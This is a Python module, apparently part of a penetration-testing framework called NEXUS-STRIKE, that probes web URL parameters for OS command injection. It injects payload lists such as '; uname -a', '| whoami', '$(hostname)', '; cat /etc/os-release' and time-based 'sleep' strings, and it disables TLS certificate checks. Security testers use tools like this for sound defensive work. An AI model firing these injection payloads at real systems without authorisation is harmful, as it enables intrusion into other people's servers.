#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.cmdi
Domain: webapp
Command Injection detection with time-based and signature-based techniques.
"""
from __future__ import annotations

import re
import ssl
import time
import urllib.request
import urllib.parse
from typing import Any

from nexus.foundation.schema import (
    Finding,
    STATUS_COMPLETED,
    STATUS_FAILED,
    STATUS_NO_FINDINGS,
    tool_result,
)
from nexus.tools.registry import tool_registry

USER_AGENT = "NEXUS-STRIKE/0.2.0 (CMDi Detector)"

CMDI_PAYLOADS = [
    ("semicolon_uname", "; uname -a", r"Linux.*\d+\.\d+\.\d+|Darwin.*Kernel"),
    ("pipe_whoami", "| whoami", r"root|www-data|nobody|apache|nginx"),
    ("backslash_id", "&& id", r"uid=\d+\(.*?)"),
    ("pipe_id", "| id", r"uid=\d+\(.*?)"),
    ("backtick_hostname", "`hostname`", r"localhost|ip-|web\d+"),
    ("dollar_hostname", "$(hostname)", r"localhost|ip-|web\d+"),
    ("newline_whoami", "%0awhoami", r"root|www-data|nobody|administrator"),
    ("os_release", "; cat /etc/os-release", r"PRETTY_NAME|Ubuntu|Debian|CentOS"),
    ("windows_ver", "& ver", r"Microsoft Windows|Windows Version"),
    ("ping_test", "; ping -c 1 127.0.0.1", None),
]

TIME_BASED_PAYLOADS = [
    ("; sleep 3", 3),
    ("| sleep 3", 3),
    ("&& sleep 3", 3),
    ("%0asleep 3", 3),
    ("`sleep 3`", 3),
    ("$(sleep 3)", 3),
]


def _http_request(url: str, timeout: int = 15) -> dict:
    """Make HTTP request with timing."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t0 = time.time()
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        elapsed = time.time() - t0
        body = resp.read(65536).decode("utf-8", errors="replace")
        return {"status": resp.status, "body": body, "time": elapsed}
    except urllib.error.HTTPError as e:
        body = e.read(65536).decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "time": 0}
    except Exception as e:
        return {"status": 0, "body": "", "time": 0}


def run(
    target: str,
    max_params: int = 10,
    timeout: int = 15,
    **kwargs: Any,
) -> dict:
    """Perform command injection testing.

    Parameters
    ----------
    target : str
        Target URL to test.
    max_params : int
        Maximum parameters to test.
    timeout : int
        Request timeout in seconds.
    """
    if not target or not target.strip():
        return tool_result("webapp.cmdi", target, status=STATUS_FAILED, error="Empty target")

    url = target if "://" in target else f"http://{target}"
    findings: list[Finding] = []
    tested_params: list[str] = []
    vulns: list[dict] = []

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        params = {"cmd": "test", "exec": "test", "command": "test", "ping": "test", "host": "test", "ip": "test", "target": "test", "server": "test"}

    tested_params = list(params.keys())[:max_params]

    for param in tested_params:
        for cmd_name, payload, signature in CMDI_PAYLOADS:
            query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            query[param] = payload
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))

            if signature is None:
                continue

            resp = _http_request(test_url, timeout)
            if resp["status"] and re.search(signature, resp["body"], re.IGNORECASE):
                vulns.append({"param": param, "type": "signature", "payload": cmd_name})
                findings.append(Finding(
                    title=f"Command injection on parameter '{param}'",
                    severity="critical",
                    confidence="high",
                    affected_asset=url,
                    evidence=f"Matched signature: {signature[:50]} via payload: {payload[:50]}",
                    remediation="Use parameterized queries, avoid shell commands, sanitize input.",
                    tool="webapp.cmdi",
                    references=["CWE-78", "OWASP-A03"],
                ))
                break

        # Time-based detection
        if not any(v["param"] == param for v in vulns):
            for payload, delay in TIME_BASED_PAYLOADS:
                query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
                query[param] = payload
                test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
                t0 = time.time()
                resp = _http_request(test_url, timeout=delay + 5)
                elapsed = time.time() - t0
                if elapsed >= delay - 0.5:
                    vulns.append({"param": param, "type": "time", "payload": payload})
                    findings.append(Finding(
                        title=f"Time-based command injection on '{param}'",
                        severity="high",
                        confidence="medium",
                        affected_asset=url,
                        evidence=f"Delay: {elapsed:.1f}s via payload: {payload[:30]}",
                        remediation="Avoid shell commands from user input, use allowlists.",
                        tool="webapp.cmdi",
                        references=["CWE-78", "OWASP-A03"],
                    ))
                    break

        if vulns:
            break

    summary = f"Command injection testing completed on {len(tested_params)} parameters"
    if vulns:
        summary += f" - {len(vulns)} vulnerabilities found"

    return tool_result(
        "webapp.cmdi", target,
        status=STATUS_COMPLETED if vulns else STATUS_NO_FINDINGS,
        findings=findings,
        summary=summary,
        metadata={"vulnerabilities": vulns, "tested_params": tested_params},
    )


tool_registry.register("webapp.cmdi", run, metadata={
    "name": "webapp.cmdi",
    "domain": "webapp",
    "status": "completed",
    "description": "Command Injection detection with time-based and signature techniques",
    "parameters": {
        "target": "Target URL to test",
        "max_params": "Maximum parameters to test (default: 10)",
        "timeout": "Request timeout in seconds (default: 15)",
    },
})